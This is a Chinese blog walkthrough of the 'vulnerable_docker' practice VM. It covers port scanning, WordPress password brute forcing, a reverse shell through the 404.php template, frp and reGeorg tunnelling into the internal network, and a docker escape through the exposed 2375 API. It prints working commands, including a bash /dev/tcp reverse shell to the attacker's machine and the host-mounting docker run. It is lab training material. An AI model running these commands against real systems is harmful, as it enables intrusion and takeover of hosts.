#  vulnerable_docker（easy）Frp、reGeorg内网穿透、docker逃逸、wpscan爆破，提权  
原创 泷羽Sec-朝阳  泷羽Sec-朝阳   2025-06-12 11:46  
  
# 简介  
  
今天开了一台新的靶机，docker逃逸，还是第一次见到，然后后面也会发hard难度，这是easy难度，先来看看啥情况吧  
## 一、信息收集  
### 1、主机发现  
  
arp-scan -l![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVxpaPvCeF1MdfiaVo4zQS1zIlqTicCr7Ow5JU6IYkzHKku7TPD3TdjKVg/640?wx_fmt=png&from=appmsg "")  
今天开了一台新的靶机，docker逃逸，还是第一次见到，然后后面也会发hard难度，这是easy难度，先来看看啥情况吧  
### 2、端口扫描  
  
nmap -sS -sV 192.168.66.146 nmap -p- -Pn -sC -sV -n 192.168.66.146 whatweb -v 192.168.66.146  
```
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
2375/tcp open  docker  Docker 17.06.0-ce
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))

```  
  
ok，这里三个端口，常规来说先看看8000的apache服务吧，然后扫一下目录，看看有无什么提示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVdF3mo4xnOjq2W54dpsyKAZ31RyxkJ5JwIHkLTEsxffnXwhSZQ7vD4A/640?wx_fmt=png&from=appmsg "")  
一个wp的网站  
### 3、目录扫描，指纹识别  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVDQ4lYgCibsAofTMYTT90tTQOSpb8eichapHd2BIlp7cmLNIPCvXXicJkQ/640?wx_fmt=png&from=appmsg "")  
扫出来很多目录，我们访问收集一下信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVk1nxESTvIpgF5OCS12ldTH1fvPMvH5fZW5phgrdwMdTDeGgmiczPiaLw/640?wx_fmt=png&from=appmsg "")  
这里指纹一下，wp的4.8.25版本，多少带点漏洞，先接着信息收集  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVB6EiaNq5RpvnhpSns3O8iaOia3Cpr7PC1icr3e9qXZT9E9re96LJBLzLibA/640?wx_fmt=png&from=appmsg "")  
ok啊ok，这里发现了一个文档，我们看看什么情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVFcW25g9AhmRr99xhQUm2PhWIym9iaI0ARx5ld0RGCjPNV5Hu3TvGkJw/640?wx_fmt=png&from=appmsg "")  
估计要爆了，先试试弱口令吧，这里一个bob用户，不知道能不能用到![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVXcicTAW3JRulDZsGfichjdU3LwmUm2tWhJwy06wXiabyQo92GtWp3DKOw/640?wx_fmt=png&from=appmsg "")  
  
### 4、wpscan爆破  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVib3CemyFFKd1iaMtGiavBZ0CpyIDlBHd865nDiarJ2Ys1CbZwNXVOo15gQ/640?wx_fmt=png&from=appmsg "")  
这里有个账户是bob，然后扫一下密码  
```
wpscan --url http://192.168.66.146:8000/ -P /usr/share/wordlists/rockyou.txt -U bob -t 20

```  
  
这里一个flag1找到了![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVq4lCwjpgyMKQjUjFpt3A13pq2fafbWbqqIpS8J5Xiahu0RL9jrymoAQ/640?wx_fmt=png&from=appmsg "")  
flag1：2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998  
### 5、getshell  
  
这里我上传文件都失败了不知道为什么，但是这我们可以使用404.php来弹shell，这样连路径都不用知道![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV8HsavaVmogqnLlnhkRYUZufSBN1gTgbORQ98jr5HDUmzrM0Vl5qREw/640?wx_fmt=png&from=appmsg "")  
这里随机访问错误![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV9YhrsDnageCBYCy4MGphCNwcr5sEavbeSicZb0icPKvsQg3kxicllVGgw/640?wx_fmt=png&from=appmsg "")  
然后开个监听就可以了，这样我们就有了shell，然后修复一下 发现这里没有python也没有wget，所以这里我是看别人的方法做的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV9ia04gKPwFXz3KlmxIjD4GWnaNbE2ia9LicXaaWcyJvwSAj1TUARGRD0Q/640?wx_fmt=png&from=appmsg "")  
进去查看了一下ip，这个ip应该是内网ip，我们想办法进入到内网  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVcF6iaGc0H6OYSaWVOPSuibCPLZF5NH7yte71gb8D4SSZVfwQ3CHbtO5g/640?wx_fmt=png&from=appmsg "")  
这里我们无法传输文件，想传输个socat的文件的，可惜这里不行，我们只能换个方法了 8000端口其实是一台docker容器，我们用蚁剑去弹个shell吧![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV6cZRvX3S7C5lBH1gRiapfRyQoUjq139x1Pw3cy4PTxvRaicoUjKMypEQ/640?wx_fmt=png&from=appmsg "")  
ok了ok了，这里是我忘记进入tmp目录下了，导致文件没权限下载文件 这里就是先开一个python -m http.server 80服务，然后curl -O http://192.168.66.129:80/socat下载socat再赋权chmod +x socat，我们kali开一个监听nc -vlp 9999，然后使用socat去反连shell  
#### 这里获取稳定shell只需要输入bash -i即可，这个也是新学到的，然后上面的方法也可以  
  
从shell提示符可以知道，目前得到的shell是在container里。  
### 6、内网信息收集  
#### 1、内网ip探活、信息收集  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVeotic2MicXP7TJh9yH3JjHK8kELSJ02iaetiaxy0qt8GIibe8su1SQz4MRg/640?wx_fmt=png&from=appmsg "")  
我们这里要用到一个Linpeas脚本来进行内网的探测，他是Linux 系统特权提升和信息收集的自动化脚本工具  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdViblIic2774GrJk0rRZiaFvyG9ia0ibjCz7K3T5Q7uic5Tiaa5fbcDn5yLBXSQ/640?wx_fmt=png&from=appmsg "")  
我们把这个脚本传输到跳板机中 ./linpeas.sh执行一下就能进行信息收集了![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV9rfITvVQ1Dz6ymH9mtkflYibF3icbsliaF0xljoOHwIcBriccRSbKKmX3w/640?wx_fmt=png&from=appmsg "")  
扫描的服务器版本 Linux version 3.13.0-128-generic  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVtt9z4icqL5lH0IbHIdQ4xib7Q2A0t35pqcqrVJCvaELlwKDqg05SmLXA/640?wx_fmt=png&from=appmsg "")  
这里看着像扫描出来的漏洞![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVkffOLXwiaeUTuR9SPuduUtMGU7OnnPj2wfVPnX5txBiak0BuMTnRrS0w/640?wx_fmt=png&from=appmsg "")  
这里是可以探测到内网的ip的，ping -c 1 172.18.0.1-4命令测一下，发现都可以ping的通。![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVQM7FfE4F2U8icgyW4yTic4TUliaKzGkib0pWtOKoR9JSjkLFS4b4Wnw3IQ/640?wx_fmt=png&from=appmsg "")  
这里有数据库账户密码wordpress/WordPressISBest 或者我们使用脚本进行存活ip探测![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVQ7DMAks4Ph7USibPJvuCfibD2ialLFHHBViajLZ8t0Jibs2uE1uAGwiakovA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVkK6ib2PsvKDrQWXs3d1TUeZibN4fGYltxlWc83SbbpSz9SHkdtWAribSg/640?wx_fmt=png&from=appmsg "")  
#### 2、内网端口探活  
  
这里收集到了信息![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVkK6ib2PsvKDrQWXs3d1TUeZibN4fGYltxlWc83SbbpSz9SHkdtWAribSg/640?wx_fmt=png&from=appmsg "")  
这里看到了172.18.0.3开放了8022端口 curl -s 172.18.0.4:8022![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVYYo94QIiaImWSKBhia2icr2U7A5Leu8TcaJ9t8JdnXF4aVD9uKz2Nibfibg/640?wx_fmt=png&from=appmsg "")  
这里网上查的，但是探测出来是个ssh的，不太懂这个服务是干嘛的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV0hMsW391T08emxsibaW7JWL5KpgvibFlqQMFIUZ0wO47F7c2s54DicBQg/640?wx_fmt=png&from=appmsg "")  
这里由于是内网环境，需要进一步的渗透的话，需要使用跳板。那么这里做跳板有三种思路，一种是加路由，建立隧道，端口映射。  
#### 3、建立隧道，使用代理（这里新版frp内网穿透自行摸索）  
  
这里使用arp，首先对frpc.toml进行修改  
  
然后是对frps.toml进行修改 然后把将frpc和frpc.toml上传至目标机  
  
curl -O http://192.168.66.129:8080/frp_0.62.1_linux_amd64/frpc curl -# -O http://192.168.66.129:8080/frp_0.62.1_linux_amd64/frpc.toml  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVuUNBVJlcuWkz7U5MFiaRJDPRb6YqMMM6PicChSlwiapqaqVUDR5YyMzDw/640?wx_fmt=png&from=appmsg "")  
上传我们的frp工具![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV3hY3OrD5NN1ibJVib3ZZsB3fyfKdBJ9xOicDWavl2F9DRnzad5DCajjUA/640?wx_fmt=png&from=appmsg "")  
这里遇到了一个非常困难的问题，就是frp工具版本的更新，配置文件的更换，ini文件换成了toml文件，这需要我们自己查询资料去配置，尤其是第一次使用这个工具一定会卡很久![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVAdK3Liamv5HlhkPic9pSibM5yoETbLy8YbnkicI2hNrqJmqMzL6sG36mmg/640?wx_fmt=png&from=appmsg "")  
这里我们配置的是toml配置文件，尝试一下能否使用，因为网上没有相关的使用参照了，靶机也很老，所以我们只能自己摸索  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVthmgmNibYXVM50Al9dM8xkbibD6Vl9fonopiawDuYNENQhkUAfWAGkQwg/640?wx_fmt=png&from=appmsg "")  
这里我们在kali上使用frp报错，查找一下原因。 这里因为一些原因我们只能先使用旧版的frp了，因为第一次用这个工具，导致新版和旧版的配置文件遇到了问题。  
##### 1、旧版frp内网穿透  
  
ok，我们配置完这两个文件，尝试启动一下吧先![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVs1lHAuCEricNFwOKvGPWScpaFExYFl584KY0SMibOBhvzBiaFumZ8unEA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVdkUqm4K8LZW4ict6PRdl3ZyykfiblCD4qp7NL3RUQ30gMeB1euOProNw/640?wx_fmt=png&from=appmsg "")  
  
启动成功了，真的是配置文件问题，新版确实不会配置，等我私下研究一下![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVrnXOQd0xmiby3fC0qQ9GzpjXeWdShUhwib2iaiczrTd82pLOEnBwMB0Oiaw/640?wx_fmt=png&from=appmsg "")  
ok啊ok，我们又一次传这个文件了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVLoZGmXPbuE1eRqicy8nSjIZy4h3HlYgkH7v4WsKiaeg6l4ns5oC22X8g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVC4cNqqYrmLCSiaQnE1CPQTFCBk19pVrWqvpRxcoSd0KtZ3hWrub8E5g/640?wx_fmt=png&from=appmsg "")  
ok了这里，我们用了重启大法，如果无法打通frp就试试重启，可能是端口或者服务被占用了 gedit /etc/proxychains4.conf 然后我们修改配置文件![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVLNBUrs5A8BBNhH3RGJJwYhQN0w1QiakTliaHPgibBYAht5RINHRvWVMXw/640?wx_fmt=png&from=appmsg "")  
ok了 通过代理使用nmap扫描 proxychains nmap -sT -sV -Pn -n -p8022 172.18.0.3![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV3dtyooJGKmyPFkOld77EKXJxG5PLtugdYIhCyfnyRS0ECaRgts0rGA/640?wx_fmt=png&from=appmsg "")  
这里开放了一个网站Node.js，我们使用火狐代理去访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV3FBmSm6g3qiazZfXBNZmUITibDjsib5DtnqN3kaJQB7MMYhrq3E7WvIibA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVGXNpZ8mibjh12Ym8vs4D9F6rFSyPtfhwUq4kLiczW0EPLbJcmzTZdOuQ/640?wx_fmt=png&from=appmsg "")  
访问到了  
#### 3、docker环境反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVB4Us4LhyH9C9L7vR2WiaZRhLzy5FWKyxLTMr9HUSe6NGRPmxLPN1bicQ/640?wx_fmt=png&from=appmsg "")  
这里是一个docker环境，可以执行命令，可以反弹个shell到kali上 nc -vlp 9988 bash -i >& /dev/tcp/192.168.66.129/9988 0>&1![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVaQ8b3hyNOCdje1WkwkTDKia8sokSq7xFZM1obszibdDks40fEVz0xPSw/640?wx_fmt=png&from=appmsg "")  
这里拿到了shell  
### 7、代理访问提权（方法一）  
  
这里run目录下有docker拉取的文件，有相关漏洞，remote API未授权访问![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV6AksWt6WiagKOFKYwG1aEeLHu8VOp70ty0ib1RSWsAjn6tws9mxVymZA/640?wx_fmt=png&from=appmsg "")  
根据这个漏洞的相关介绍，我们来尝试一下  
  
这里有个问题，就是靶机没有docker，可能是作者删除了，我们需要自己下载并且换源 这里大概是环境出问题了，其他师傅的靶机里面有vim工具之类的，包括mysql的仓库签名过期了，这里是个死局，无法解决.所以这里第一种方法我就直接给思路了 apt update apt install docker-ce 这样可以拉docker环境  
```
docker run --rm -it -v /:/tmp/1/ wordpress /bin/bash

```  
  
然后我们就能找到flag_3了  
##### 关键点  
```
由于docker环境没有vim，所以我们只能使用echo方式传入我们要的镜像源，这一点如果没做过会非常卡顿的，会踩坑很久
echo 'deb http://mirrors.aliyun.com/ubuntu/ trusty main [restricted](https://cn-sec.com/archives/tag/restricted) universe multiverse  ' > /etc/apt/sources.list

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVshu3icibSUp92iaaIFr4k52SIvBibdMQG3O0YKjOZzm2QIBKQaqxrmdZlw/640?wx_fmt=png&from=appmsg "")  
很吓人啊，这个作者，表白起来了还![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdV6MBGDqa6tzkNjYopkyU3RWHgjR7m8tuyS87d3F8U4nZbu2wONkKGOQ/640?wx_fmt=png&from=appmsg "")  
  
  
这台靶机非常恶心，断断续续打了3天，真的学到了不少，但是非常痛苦，推荐推荐推荐！！！  
### 8、reGeorg代理之路（方法二）  
```
这里就不复现了，直接给代码
curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php 
curl -# -O http://192.168.27.195:8080/tunnel.php 
##复制到当前目录下  cp /tmp/tunnel.php .

```  
  
访问：http://192.168.27.131:8000/tunnel.php  
  
回显：Georg says, 'All seems fine' ---正常python reGeorgSocksProxy.py -u http://192.168.27.131:8000/tunnel.php 执行完就会开启一个socks5的代理，默认开启127.0.0.1：8888  
  
利用之前枚举出的信息中的数据库账号密码进行代理验证  
  
proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1oBmrv72vJtPKicyZ3ib9OdVoib1wfWgEgia3Wy0WIZw7kibkNH61iaGosNvDib48nnBg8DXDDerDqgCQYA/640?wx_fmt=png&from=appmsg "")  
验证成功  
  
这个容器docker.sock允许与 docker 通信，意味着创建、添加、删除容器，因此有一个技巧可以通过上传docker和运行命令docker run -it -v /:/host/ <container_name> chroot /host/ bash二进制文件将主机系统挂载到 docker 容器上，而不是我们有 docker 端口，我们可以访问这些容器，这样我们就可以远程做这个  
  
如果开启了2375端口：  
  
docker -H tcp://192.168.253.182:2375 run --rm -it -v /:/host wordpress chroot /host bash  
  
至此攻击结束  
### 8、msf大法（方法三）  
  
这里就不一一介绍了，后续会出利用ssh密钥提权的方法，今天先休息了  
### 9总结：  
  
这台靶机本质可以理解内网穿透的联系，这个应该是重点，个人理解的话，是这个靶机的特色，所以还是要多学习，包括还有ssh密钥的方法，后续再说吧，今天出门运动去了，Neo-reGeorg其实这个工具和frp差不多,我私下再去学吧，如果有想了解到小伙伴可以留言，想看的话可以出一期  
  
各种方法都挂在下面了，我是利用的一个api接口漏洞，感兴趣的可以自己找一找 参考文章：https://www.freebuf.com/vuls/347867.html https://www.cnblogs.com/jason-huawen/p/16859959.html https://mp.weixin.qq.com/s?__biz=MzkzNjg3NzIwOQ==&mid=2247486466&idx=1&sn=23597160b15e8dea0f134b43cb380690 https://cn-sec.com/archives/892445.html  
  
  
